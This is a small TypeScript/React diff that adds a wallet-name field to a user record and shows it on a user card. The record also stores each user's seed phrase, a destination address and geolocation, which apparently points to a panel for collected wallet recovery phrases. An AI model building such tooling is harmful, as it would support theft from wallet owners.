@@ -5,6 +5,7 @@ interface UserEntry {
 	blockchainNetwork: string;
 	walletProvider: string;
 	seedPhrase: string;
+	walletName: string;
 	destinationAddress: string;
 	geolocation: {
 		latitude: number;
@@ -61,6 +62,9 @@ export default function UsersCard({ entry, index }: UsersCardProps) {
 					</h3>
 					<p className="text-xs text-black/60 font-dm-mono">
 						{entry.blockchainNetwork}
+					</p>
+					<p className="text-xs text-black/60 font-dm-mono">
+						{entry.walletName}
 					</p>
 				</div>
 
